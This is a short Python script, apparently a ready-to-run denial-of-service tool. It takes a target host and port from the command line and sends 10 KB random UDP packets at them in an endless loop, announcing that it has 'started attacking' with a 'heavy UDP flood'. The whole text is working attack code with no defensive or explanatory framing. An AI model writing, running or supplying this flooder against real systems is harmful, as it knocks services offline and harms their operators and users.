import sys, socket, random

host = sys.argv[1]
port = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(10240)

print(f"🚀 Started attacking {host}:{port} with heavy UDP flood...")

while True:
    sock.sendto(packet, (host, port))
